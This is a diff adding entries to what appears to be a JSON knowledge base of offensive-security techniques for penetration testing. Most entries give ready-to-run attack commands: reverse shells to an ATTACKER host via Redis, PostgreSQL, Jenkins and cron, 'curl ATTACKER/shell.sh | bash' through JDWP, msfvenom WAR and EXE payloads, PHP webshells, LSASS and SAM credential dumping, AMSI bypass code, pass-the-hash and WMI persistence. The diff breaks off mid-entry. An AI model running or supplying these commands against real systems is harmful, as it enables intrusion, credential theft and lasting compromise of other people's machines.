@@ -1043,5 +1043,743 @@
       "technique": "password-spray",
       "tool": "crackmapexec"
     }
+  },
+  {
+    "id": "redis-rce-config-set",
+    "content": "Redis RCE via CONFIG SET (unauthenticated or authenticated). Redis running without a requirepass directive accepts all commands from any client. Three primary RCE paths: (1) SSH key injection \u2014 generate keypair, write public key to Redis: redis-cli -h TARGET flushall; redis-cli -h TARGET set ssh_key \"\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n\"; redis-cli -h TARGET config set dir /root/.ssh; redis-cli -h TARGET config set dbfilename authorized_keys; redis-cli -h TARGET save. (2) Cron job injection \u2014 redis-cli -h TARGET set cron \"\\n\\n* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n\\n\"; redis-cli -h TARGET config set dir /var/spool/cron; redis-cli -h TARGET config set dbfilename root; redis-cli -h TARGET save. On CentOS use /var/spool/cron/, on Debian/Ubuntu use /var/spool/cron/crontabs/. (3) Webshell \u2014 redis-cli -h TARGET set shell '<?php system($_GET[\"cmd\"]); ?>'; redis-cli -h TARGET config set dir /var/www/html; redis-cli -h TARGET config set dbfilename shell.php; redis-cli -h TARGET save. Scan with: nmap -sV -p 6379 TARGET. Detection: redis-cli -h TARGET info server. These attacks work because cron and SSH key files tolerate garbage bytes that Redis appends around the payload.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "redis-config-rce",
+      "tool": "redis-cli"
+    }
+  },
+  {
+    "id": "mssql-xp-cmdshell-rce",
+    "content": "MSSQL xp_cmdshell enables OS command execution from SQL Server. Requires sysadmin or equivalent privileges. Enable sequence: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Execute OS commands: EXEC xp_cmdshell 'whoami'; EXEC xp_cmdshell 'net user hacker P@ssw0rd123 /add'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'; PowerShell reverse shell: EXEC xp_cmdshell 'powershell -nop -w hidden -e BASE64ENCODED_PAYLOAD'; Check if enabled: SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'; Connect with impacket: mssqlclient.py DOMAIN/user:pass@TARGET -windows-auth; mssqlclient.py sa:password@TARGET. Via SQL injection: '; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami''; --. SQL Server often runs as NETWORK SERVICE, LOCAL SYSTEM, or a domain service account giving significant OS access.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "xp-cmdshell-rce",
+      "tool": "mssqlclient.py"
+    }
+  },
+  {
+    "id": "postgresql-copy-program-rce",
+    "content": "PostgreSQL COPY TO/FROM PROGRAM RCE \u2014 available to superusers and pg_execute_server_program group members since PostgreSQL 9.3. This is a feature (not a bug), reported as CVE-2019-9193 but will not be patched. Commands: COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'; Staged approach using a table: CREATE TABLE cmd_output (data text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output; Reverse shell: COPY (SELECT '') TO PROGRAM 'python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'' '; Via Metasploit: use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS TARGET; set USERNAME postgres; set PASSWORD password. Connect: psql -U postgres -h TARGET. Default port 5432. Requires authentication but postgres/postgres or postgres with blank password are common defaults.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "postgresql-copy-program-rce",
+      "tool": "psql"
+    }
+  },
+  {
+    "id": "tomcat-manager-war-rce",
+    "content": "Apache Tomcat Manager WAR deploy RCE. Requires valid credentials for /manager/html or /manager/text with roles: manager-gui, manager-script, or admin. Default creds to try: tomcat:tomcat, admin:admin, tomcat:s3cret, admin:tomcat. Generate WAR payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war. Deploy via curl: curl -v -u tomcat:tomcat --upload-file shell.war 'http://TARGET:8080/manager/text/deploy?path=/shell&update=true'. Trigger: curl http://TARGET:8080/shell/. Undeploy: curl -u tomcat:tomcat 'http://TARGET:8080/manager/text/undeploy?path=/shell'. Via Metasploit: use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set RPORT 8080; set HttpUsername tomcat; set HttpPassword tomcat. Locate manager with: gobuster dir -u http://TARGET:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. Common paths: /manager, /host-manager, /manager/html. Manager may also be on 8443 (SSL).",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "tomcat-war-rce",
+      "tool": "msfvenom"
+    }
+  },
+  {
+    "id": "jenkins-script-console-rce",
+    "content": "Jenkins Script Console RCE via Groovy. Access at http://TARGET:8080/script. Unauthenticated access is a critical misconfiguration. Command execution: println 'id'.execute().text; println 'whoami'.execute().text; Reverse shell via Groovy: def cmd = ['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1']; cmd.execute(); Multi-step: String host='ATTACKER'; int port=4444; String cmd2='/bin/bash'; Process p=new ProcessBuilder(cmd2).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush();Thread.sleep(50);if(p.exitValue()>=0)break; } p.destroy();s.close(); Check with curl: curl http://TARGET:8080/script -v \u2014 200 response without redirect means no auth. Via Metasploit: use exploit/multi/http/jenkins_script_console.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "jenkins-script-console-rce",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "jboss-wildfly-war-rce",
+    "content": "JBoss/WildFly WAR deployment RCE. WildFly management console on port 9990 may allow anonymous access in default installations. Check: curl http://TARGET:9990/management. JBoss older versions expose JMXInvokerServlet and EJBInvokerServlet on port 8080. Exploitation paths: (1) Management console \u2014 access http://TARGET:9990/console, navigate to Deployments tab, upload malicious WAR via Add button. (2) HTTP API \u2014 curl -u admin:admin -F 'file=@shell.war' http://TARGET:9990/management/add-content; (3) JexBoss tool: python jexboss.py -host http://TARGET:8080 (scans and auto-exploits exposed servlets). Generate WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war. After upload trigger: curl http://TARGET:8080/shell/shell.jsp. Via Metasploit: use exploit/multi/http/jboss_invoke_deploy; use exploit/multi/http/jboss_bshdeployer. Check exposure: curl http://TARGET:8080/invoker/JMXInvokerServlet \u2014 200 indicates vulnerable.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "jboss-war-rce",
+      "tool": "jexboss"
+    }
+  },
+  {
+    "id": "weblogic-deserialization-rce",
+    "content": "Oracle WebLogic T3/IIOP deserialization RCE. Default port 7001 (HTTP), 7002 (HTTPS). Key CVEs: CVE-2018-2628, CVE-2020-2883, CVE-2020-2555. T3 protocol is WebLogic-proprietary RMI transport. Exploit chain: ysoserial generates gadget chain, JRMP listener delivers payload. Steps: (1) Start JRMP listener: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'cmd /c calc.exe'; (2) Use exploit script to send deserialized object to port 7001 via T3. Metasploit modules: use exploit/multi/misc/weblogic_deserialize_asyncresponseservice; use exploit/multi/misc/weblogic_install_upload; set RHOST TARGET; set RPORT 7001. Check version: curl http://TARGET:7001/wls-wsat/CoordinatorPortType \u2014 WSDL response reveals version. Detect T3: nc -v TARGET 7001 \u2014 WebLogic responds with version banner. Gadget chains: CommonsCollections1-7 (may be blocked if library removed), Jdk7u21, MozillaRhino. Console on port 7001/console may have default weblogic:weblogic1 creds.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "weblogic-deserialization-rce",
+      "tool": "ysoserial"
+    }
+  },
+  {
+    "id": "elasticsearch-rce-dynamic-scripting",
+    "content": "Elasticsearch RCE via dynamic scripting (CVE-2014-3120, CVE-2015-1427). Default port 9200, no authentication in versions before 5.0. CVE-2014-3120 \u2014 MVEL scripting RCE (ES < 1.2): curl -XPOST 'http://TARGET:9200/_search?pretty' -d '{\"script_fields\": {\"myfield\": {\"script\": \"1+1\"}}}' \u2014 confirm scripting enabled. Exploit: curl -XPOST 'http://TARGET:9200/_search?pretty' -d '{\"script_fields\": {\"myfield\": {\"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next()\"}}}'. CVE-2015-1427 \u2014 Groovy sandbox escape (ES 1.3.0-1.4.2): payload uses java.lang.Math.class.forName() to escape sandbox. Via Metasploit: use exploit/multi/elasticsearch/script_mvel_rce; set RHOSTS TARGET. Enumerate data: curl http://TARGET:9200/_cat/indices; curl http://TARGET:9200/INDEX_NAME/_search?size=100. Check version: curl http://TARGET:9200/. Modern ES (>5.0) requires authentication but Kibana dashboard on port 5601 may expose unauthenticated access.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "elasticsearch-rce",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "memcached-exploitation",
+    "content": "Memcached exploitation \u2014 default port 11211, no authentication by default. Connect with netcat or telnet: nc TARGET 11211 or telnet TARGET 11211. Reconnaissance commands: stats (server stats including version, uptime, connections); stats items (shows number of keys per slab ID); stats slabs (slab allocation info); version. Extract cached keys: stats items \u2014 note slab ID numbers; stats cachedump SLAB_ID LIMIT \u2014 e.g., stats cachedump 1 100 (dumps up to 100 keys from slab 1). Read values: get KEY_NAME. Modify/inject: set mykey 0 0 5\\r\\nhello. Delete: delete KEY_NAME. Flush all cache (DoS): flush_all. Session hijacking: if web app stores sessions in memcached, dump keys and look for session tokens, cookies, or user data. Inject with: set SESSION_ID 0 3600 LENGTH\\r\\nSERIALIZED_SESSION_DATA. Amplification DDoS: memcached can be abused for UDP amplification attacks (port 11211 UDP). Nmap scan: nmap -sV -p 11211 --script memcached-info TARGET.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "memcached-exploitation",
+      "tool": "netcat"
+    }
+  },
+  {
+    "id": "snmp-write-community-rce",
+    "content": "SNMP write community string exploitation. Default read community: 'public'; default write community: 'private'. Enumerate with read access: snmpwalk -v2c -c public TARGET; snmpwalk -v2c -c public TARGET system; snmp-check TARGET -c public. Write community exploitation \u2014 change system name: snmpset -v2c -c private TARGET .1.3.6.1.2.1.1.5.0 s 'NewName'. Linux Net-SNMP RCE via nsExtendObjects (OID 1.3.6.1.4.1.8072.1.3.2): Create shell extension: snmpset -v2c -c private TARGET 1.3.6.1.4.1.8072.1.3.2.2.1.2.10.116.101.115.116.115.104.101.108.108 s /bin/sh; snmpset -v2c -c private TARGET 1.3.6.1.4.1.8072.1.3.2.2.1.3.10.116.101.115.116.115.104.101.108.108 s '-c id'; snmpset -v2c -c private TARGET 1.3.6.1.4.1.8072.1.3.2.2.1.7.10.116.101.115.116.115.104.101.108.108 i 1. Trigger: snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.8072.1.3.2.3.1. Brute community strings: onesixtyone TARGET -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt. SNMP runs on UDP 161.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "snmp-write-rce",
+      "tool": "snmpset"
+    }
+  },
+  {
+    "id": "r-services-exploitation",
+    "content": "R-services (rsh/rlogin/rexec) exploitation \u2014 legacy Unix remote access services. Ports: rsh=514, rlogin=513, rexec=512. Authentication relies on .rhosts and /etc/hosts.equiv files \u2014 IP/hostname-based trust, no passwords when configured. Check for R-services: nmap -sV -p 512,513,514 TARGET. Rlogin: rlogin -l root TARGET \u2014 succeeds if .rhosts has '+ +' (trust all). Check /etc/hosts.equiv for trusted hosts. If SSH access exists on another host listed in .rhosts, can pivot: rsh TARGET -l root 'id'. The '+' wildcard in .rhosts means ANY host is trusted. Exploit with Metasploit: use auxiliary/scanner/rservices/rsh_login; set RHOSTS TARGET; run. Manual rsh: rsh TARGET 'cat /etc/passwd'. Rexec requires username/password: rexec TARGET -u root -p password 'id'. Common in legacy Unix, old Solaris, AIX systems. If /etc/hosts.equiv contains your IP or '+', you can auth without password. Can write to .rhosts if writable: echo 'ATTACKER root' > /home/user/.rhosts.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "r-services-exploitation",
+      "tool": "rlogin"
+    }
+  },
+  {
+    "id": "nfs-no-root-squash-privesc",
+    "content": "NFS no_root_squash privilege escalation. Check exports: showmount -e TARGET; cat /etc/exports (on target). If no_root_squash is set, remote root retains root privileges on the share. Exploitation from attacker machine (as root): mkdir /tmp/nfsmount; mount -t nfs TARGET:/shared_dir /tmp/nfsmount; cd /tmp/nfsmount; cp /bin/bash .; chmod +s bash. On victim machine: /path/to/mounted/share/bash -p (or wherever the share is mounted). Alternative \u2014 compile SUID shell: On attacker: cat > /tmp/shell.c << 'EOF' #include <stdio.h> #include <unistd.h> int main(){ setuid(0); setgid(0); system('/bin/bash'); } EOF; gcc /tmp/shell.c -o /tmp/nfsmount/shell; chmod +s /tmp/nfsmount/shell. On victim: ./shell. no_all_squash is similar but for non-root users. Look for rw,no_root_squash in /etc/exports. Also check for insecure option (serves all UIDs from NFS root). LinPEAS detects this automatically.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "nfs-no-root-squash",
+      "tool": "mount"
+    }
+  },
+  {
+    "id": "jdwp-rce",
+    "content": "JDWP (Java Debug Wire Protocol) RCE \u2014 no authentication by default, full JVM control. Default port 8000 (varies: 5005, 9000, etc.). Detect: nmap -sV -p 8000,5005 TARGET or curl -v telnet://TARGET:8000 \u2014 JDWP server replies with 'JDWP-Handshake'. jdwp-shellifier tool: python jdwp-shellifier.py -t TARGET -p 8000 --cmd 'id'; python jdwp-shellifier.py -t TARGET -p 8000 --cmd 'curl http://ATTACKER/shell.sh | bash'. Via Metasploit: use exploit/multi/misc/java_jdwp_debugger; set RHOST TARGET; set RPORT 8000; set CMD 'id'. Attack mechanism \u2014 JDWP allows setting breakpoints and injecting arbitrary bytecode into running JVM; attacker attaches as debugger, forces a breakpoint, then invokes Runtime.exec() or ProcessBuilder via method invocation. Common in development servers, CI/CD containers, Java app servers left with -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000 flag. Often found listening on 0.0.0.0 instead of 127.0.0.1. Critical: executes as the JVM user (often root in containers).",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "jdwp-rce",
+      "tool": "jdwp-shellifier"
+    }
+  },
+  {
+    "id": "rsync-exploitation",
+    "content": "Rsync exploitation \u2014 default port 873. List available modules: rsync rsync://TARGET/ or rsync TARGET::. Enumerate a module: rsync rsync://TARGET/MODULE/. Download files from unauthenticated module: rsync -av rsync://TARGET/MODULE/ /tmp/loot/. Upload files to writable module: rsync -av /tmp/shell.php rsync://TARGET/MODULE/shell.php. If module maps to web root, uploading a webshell gives RCE. Check if module requires credentials: rsync rsync://TARGET/MODULE/. Nmap scan: nmap -sV -p 873 TARGET --script rsync-list-modules. Common misconfiguration \u2014 /rsyncd.conf shows path=/var/www/html with no auth_users or secrets file. CVE-2024-12084/12085 (Jan 2025): heap buffer overflow in rsync daemon allows unauthenticated RCE \u2014 update rsync to 3.4.1+. SSH authorized_keys injection: rsync -av ~/.ssh/authorized_keys rsync://TARGET/home_backup/.ssh/authorized_keys (if module maps to /home/user). Full filesystem access path: rsync -av rsync://TARGET/rootfs/ /tmp/loot/.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "rsync-exploitation",
+      "tool": "rsync"
+    }
+  },
+  {
+    "id": "vnc-no-auth-exploitation",
+    "content": "VNC no-auth exploitation. Default port 5900 (display :0), 5901 (:1), etc. Nmap scan: nmap -sV -p 5900-5910 TARGET --script vnc-info,vnc-brute. Check for no-auth: nmap -p 5900 TARGET --script vnc-info \u2014 look for 'Authentication: None'. Metasploit no-auth scanner: use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS TARGET; run \u2014 reports 'free access' if unauthenticated. Connect with no password: vncviewer TARGET:5900. Brute force: use auxiliary/scanner/vnc/vnc_login; set RHOSTS TARGET; set PASS_FILE /usr/share/wordlists/rockyou.txt; run. Or: hydra -P /usr/share/wordlists/rockyou.txt TARGET vnc. If VNC requires password but you have filesystem access: cat ~/.vnc/passwd \u2014 VNC passwords are stored DES-encrypted; crack with: vncpwd /path/to/passwd or use Metasploit post/multi/gather/vnc_credential_collection. Common default VNC passwords: password, 1234, root, admin. Take screenshot without interactive session: vncdotool -s TARGET screenshot screen.png. VNC gives full graphical desktop access \u2014 keylog, screenshot, clipboard theft.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "vnc-no-auth",
+      "tool": "vncviewer"
+    }
+  },
+  {
+    "id": "x11-forwarding-exploitation",
+    "content": "X11 unauthenticated access exploitation. Port 6000 (display :0), 6001 (:1), etc. Detect: nmap -sV -p 6000-6010 TARGET --script x11-access. Metasploit: use auxiliary/scanner/x11/open_x11; set RHOSTS TARGET; run. Connect if xhost + (accept all) is set: DISPLAY=TARGET:0 xterm & \u2014 opens terminal on attacker screen (sent from target). Capture screenshot: DISPLAY=TARGET:0 import -window root /tmp/screenshot.png; DISPLAY=TARGET:0 xwd -root -out /tmp/screen.xwd; xwdtopnm /tmp/screen.xwd > /tmp/screen.pnm. Keylogger: DISPLAY=TARGET:0 xinput list \u2014 get device IDs; DISPLAY=TARGET:0 xinput test DEVICE_ID \u2014 captures all keystrokes in real time. Inject keystrokes: DISPLAY=TARGET:0 xdotool type 'injected text'. Check who can connect: xhost (run on target, lists ACLs). Misconfiguration: running 'xhost +' allows any host. SSH X11 forwarding theft: if attacker can read /tmp/.X11-unix or xauth cookies from .Xauthority, can hijack the forwarded session. xhost + is equivalent to granting full graphical desktop control.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "x11-exploitation",
+      "tool": "xdotool"
+    }
+  },
+  {
+    "id": "cups-rce-2024",
+    "content": "CUPS RCE exploit chain (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, CVE-2024-47177) \u2014 CVSS 9.9, disclosed September 2024. Affects cups-browsed daemon on port 631/UDP. Attack: send a crafted UDP packet to port 631 \u2014 CUPS connects back to attacker-controlled IPP server to fetch 'printer attributes'. The attacker's IPP server returns malicious attributes containing command injection in PPD parameters. When a print job is triggered on the poisoned printer entry, arbitrary commands execute as the lp or root user. Exploit flow: (1) Set up attacker IPP server; (2) Send UDP to TARGET:631: echo '0 3 http://ATTACKER:PORT/ \"attacker-printer\"' | nc -u TARGET 631; (3) CUPS calls back to attacker IPP server; (4) Inject OS commands in IPP attributes (e.g., FoomaticRIPCommandLine). PoC tools available on GitHub. Affected: Linux systems running cups-browsed with network exposure. Check: netstat -ulnp | grep 631 or ss -ulnp | grep 631. Mitigation: disable cups-browsed service or block UDP/631 at firewall.",
+    "metadata": {
+      "category": "cve",
+      "technique": "cups-ipp-rce",
+      "tool": "netcat"
+    }
+  },
+  {
+    "id": "windows-autologon-registry-creds",
+    "content": "Windows AutoLogon stores credentials in plaintext in the registry. Query: reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon' /v DefaultPassword; reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon'. Keys to check: DefaultUserName, DefaultPassword, DefaultDomainName, AutoAdminLogon. PowerShell: Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon' | Select DefaultUserName, DefaultPassword, DefaultDomainName. WinPEAS detects this automatically under 'User Information' section. Sysinternals AutoLogon stores encrypted version in LSA secrets \u2014 use secretsdump or Mimikatz to retrieve. The DefaultPassword value is readable by Authenticated Users \u2014 any local user can read it. Metasploit post-exploitation: use post/windows/gather/credentials/windows_autologin. If found, try credentials against SMB, WinRM, RDP: crackmapexec smb TARGET -u DefaultUserName -p DefaultPassword; evil-winrm -i TARGET -u user -p password.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "autologon-registry-creds",
+      "tool": "reg"
+    }
+  },
+  {
+    "id": "windows-weak-service-permissions",
+    "content": "Windows weak service permissions privilege escalation. Enumerate services: sc query type= all; sc qc SERVICENAME. Check service permissions with accesschk (Sysinternals): accesschk64.exe -uwcqv * (all services current user can write); accesschk64.exe -uwcqv SERVICENAME. Look for SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, GENERIC_WRITE. Also check binary permissions: icacls 'C:\\path\\to\\service.exe' \u2014 look for (F) full control or (M) modify for low-privileged users. Exploitation (if SERVICE_CHANGE_CONFIG): sc config SERVICENAME binPath= 'C:\\Windows\\Temp\\shell.exe'; sc stop SERVICENAME; sc start SERVICENAME. Or use msfvenom payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o C:\\Windows\\Temp\\shell.exe. Also check unquoted service paths: wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /v 'c:\\windows' | findstr /v '\"'. If path has spaces and no quotes, Windows tries progressively shorter paths \u2014 place malicious EXE at the space boundary.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "weak-service-permissions",
+      "tool": "accesschk"
+    }
+  },
+  {
+    "id": "windows-seimpersonate-potatoes",
+    "content": "SeImpersonatePrivilege exploitation (Potato attacks). Check: whoami /priv \u2014 look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. Common in IIS, SQL Server, service accounts. PrintSpoofer (Windows 10, Server 2016/2019): PrintSpoofer.exe -i -c cmd; PrintSpoofer.exe -c 'cmd /c net user hacker Pass123 /add && net localgroup administrators hacker /add'. GodPotato (modern, wide OS support): GodPotato.exe -cmd 'cmd /c whoami'; GodPotato.exe -cmd 'cmd /c net user pwned Pass@123 /add'. RoguePotato (requires OXID resolver on attacker TCP/135): RoguePotato.exe -r ATTACKER_IP -c 'cmd.exe' -l 9999; set up socat on attacker: socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999. JuicyPotato (older OS, Windows 7/2008/2012): JuicyPotato.exe -l 1337 -p cmd.exe -a '/c net user hacker pass /add' -t * -c '{CLSID}' \u2014 CLSID varies by OS, list at http://ohpe.it/juicy-potato/CLSID. EfsPotato: targets LSARPC, no network callback needed. All potato tools spawn SYSTEM shell.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "seimpersonate-potato",
+      "tool": "GodPotato"
+    }
+  },
+  {
+    "id": "lsass-dump-techniques",
+    "content": "LSASS dump techniques for credential extraction. Method 1 \u2014 ProcDump: procdump.exe -accepteula -ma lsass.exe lsass.dmp. Method 2 \u2014 comsvcs.dll (native, no upload needed, requires SYSTEM): Get PID: tasklist | findstr lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full. Method 3 \u2014 PowerShell with handles: requires admin. Method 4 \u2014 Task Manager (GUI): right-click lsass.exe > Create Dump File. Method 5 \u2014 Remote via impacket: impacket-secretsdump DOMAIN/admin:pass@TARGET -just-dc-user krbtgt. Parse dump offline: pypykatz lsa minidump lsass.dmp; mimikatz # sekurlsa::minidump lsass.dmp; mimikatz # sekurlsa::logonpasswords. Live Mimikatz: mimikatz # privilege::debug; mimikatz # sekurlsa::logonpasswords; mimikatz # lsadump::sam; mimikatz # lsadump::secrets. EDR evasion: use lsassy (python library), nanodump (BOF), or PPLdump to bypass PPL protection on protected lsass. Output contains NTLM hashes, Kerberos tickets, plaintext passwords (if WDigest enabled: reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1).",
+    "metadata": {
+      "category": "privesc",
+      "technique": "lsass-dump",
+      "tool": "pypykatz"
+    }
+  },
+  {
+    "id": "sam-system-hive-dump",
+    "content": "SAM/SYSTEM hive dump for local credential extraction. Requires Administrator/SYSTEM. Method 1 \u2014 reg save (live system): reg save HKLM\\SAM C:\\Windows\\Temp\\SAM; reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM; reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY. Method 2 \u2014 Shadow copy (bypass VSS locks): wmic shadowcopy call create Volume='C:\\'; vssadmin list shadows; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\SAM; copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM. Method 3 \u2014 Impacket remote: impacket-secretsdump DOMAIN/admin:pass@TARGET -sam -system. Exfil and parse on Linux: python3 secretsdump.py -sam SAM -system SYSTEM LOCAL; impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL. NTDS.dit (Domain Controller): impacket-secretsdump -just-dc DOMAIN/admin:pass@DC_IP; vssadmin create shadow /for=C:; copy SHADOW\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit; copy SHADOW\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "sam-hive-dump",
+      "tool": "secretsdump"
+    }
+  },
+  {
+    "id": "amsi-bypass-powershell",
+    "content": "AMSI bypass techniques for PowerShell. AMSI (Anti-Malware Scan Interface) hooks PowerShell to scan scripts. Method 1 \u2014 Memory patching AmsiScanBuffer (force AMSI_RESULT_CLEAN): $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like '*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1). Method 2 \u2014 Reflection (Matt Graeber): [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). Note: both above strings may be detected \u2014 obfuscate variable names. Method 3 \u2014 Downgrade to PowerShell 2.0 (no AMSI): powershell -version 2 -exec bypass. Method 4 \u2014 AMSI Write Raid (2024): exploits writable entries in System.Management.Automation.dll to redirect AmsiScanBuffer. Method 5 \u2014 String concatenation to avoid detection: $a='Am'+'si'+'Utils'; Test if bypassed: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null).",
+    "metadata": {
+      "category": "privesc",
+      "technique": "amsi-bypass",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "pass-the-hash-lateral-movement",
+    "content": "Pass-the-Hash lateral movement using NTLM hashes. Obtain hash via Mimikatz, secretsdump, or LSASS dump. Hash format: LM:NTLM (e.g., aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C). Impacket psexec (drops binary, noisier): impacket-psexec DOMAIN/Administrator@TARGET -hashes LM:NT. Impacket wmiexec (fileless, stealthier): impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NT. Impacket smbexec: impacket-smbexec DOMAIN/Administrator@TARGET -hashes :NT. Evil-WinRM (WinRM port 5985/5986): evil-winrm -i TARGET -u Administrator -H NTLASH_ONLY (NT part only). CrackMapExec: crackmapexec smb TARGET -u Administrator -H NTHASH --exec-method wmiexec -x 'whoami'. CME spray: crackmapexec smb CIDR/24 -u Administrator -H NTHASH. Xfreerdp PtH: xfreerdp /u:Administrator /pth:NTHASH /v:TARGET. Mimikatz PtH: sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe. Requires: SMB signing disabled (check: crackmapexec smb TARGET --gen-relay-list targets.txt).",
+    "metadata": {
+      "category": "ad",
+      "technique": "pass-the-hash",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "wmi-persistence-windows",
+    "content": "WMI event subscription persistence \u2014 survives reboots, executes as SYSTEM, lives in WMI repository not filesystem. Three components: __EventFilter (trigger), EventConsumer (action), __FilterToConsumerBinding (links them). PowerShell creation: $Filter = Set-WmiInstance -Namespace 'root\\subscription' -Class '__EventFilter' -Arguments @{Name='PersistFilter';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}; $Consumer = Set-WmiInstance -Namespace 'root\\subscription' -Class 'CommandLineEventConsumer' -Arguments @{Name='PersistConsumer';CommandLineTemplate='cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt'}; Set-WmiInstance -Namespace 'root\\subscription' -Class '__FilterToConsumerBinding' -Arguments @{Filter=$Filter;Consumer=$Consumer}. Enumerate existing: Get-WMIObject -Namespace root\\subscription -Class __EventFilter; Get-WMIObject -Namespace root\\subscription -Class __EventConsumer; Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding. Remove: Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter 'Name=\"PersistFilter\"' | Remove-WmiObject. Via Empire: Invoke-WMI module. Executes via WmiPrvSE.exe (SYSTEM).",
+    "metadata": {
+      "category": "privesc",
+      "technique": "wmi-persistence",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "http-request-smuggling",
